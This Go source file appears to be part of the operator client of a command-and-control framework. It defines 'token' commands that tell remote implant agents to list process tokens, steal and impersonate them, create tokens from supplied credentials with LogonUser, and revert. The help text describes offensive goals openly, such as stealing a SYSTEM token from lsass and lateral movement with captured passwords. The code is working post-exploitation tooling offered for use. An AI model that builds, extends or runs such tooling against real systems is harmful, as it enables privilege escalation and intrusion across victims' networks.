package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var tokenCmd = &cobra.Command{
	Use:   "token",
	Short: "Token manipulation (steal, impersonate, make, revert)",
}

// token list <agent-id>
var tokenListCmd = &cobra.Command{
	Use:   "list <agent-id>",
	Short: "List processes and their token users/integrity levels",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/token/list", nil, "application/json")
		if err != nil {
			printError(fmt.Sprintf("Token list failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			printError("Token list request failed")
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess("Token list queued")

		if wait && cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// token steal <agent-id> --pid <pid>
var tokenStealCmd = &cobra.Command{
	Use:   "steal <agent-id>",
	Short: "Steal and impersonate a token from another process",
	Long: `Duplicates the primary token of a running process and impersonates it in
the agent thread. Use 'token list' to find a suitable process.

Examples:
  token steal 7d019eb7 --pid 524     # steal SYSTEM token from lsass
  token steal 7d019eb7 --pid 1234 --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		pid, _ := cmd.Flags().GetUint32("pid")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if pid == 0 {
			printError("--pid is required")
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{"pid": pid})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/token/steal",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Token steal failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Token steal failed: %s", msg))
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Token steal queued (PID %d)", pid))

		if wait && cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// token make <agent-id> --user <u> --domain <d> --pass <p>
var tokenMakeCmd = &cobra.Command{
	Use:   "make <agent-id>",
	Short: "Create a token via LogonUser (lateral movement without spawning process)",
	Long: `Calls LogonUser to create a token for a given user:domain:password combination.
Useful for lateral movement when you have credentials but no process to steal from.

Examples:
  token make 7d019eb7 --user Administrator --domain CORP --pass "P@ssw0rd!"
  token make 7d019eb7 --user localadmin --pass "hunter2" --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		user, _ := cmd.Flags().GetString("user")
		domain, _ := cmd.Flags().GetString("domain")
		pass, _ := cmd.Flags().GetString("pass")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if user == "" || pass == "" {
			printError("--user and --pass are required")
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]string{
			"user": user, "domain": domain, "pass": pass,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/token/make",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Token make failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Token make failed: %s", msg))
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		u, _ := dataMap["user"].(string)
		printSuccess(fmt.Sprintf("Token make queued: %s", u))

		if wait && cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// token revert <agent-id>
var tokenRevertCmd = &cobra.Command{
	Use:   "revert <agent-id>",
	Short: "Revert to original agent token (RevertToSelf)",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/token/revert", nil, "application/json")
		if err != nil {
			printError(fmt.Sprintf("Token revert failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			printError("Token revert request failed")
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess("Token revert queued")

		if wait && cmdID != "" {
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}
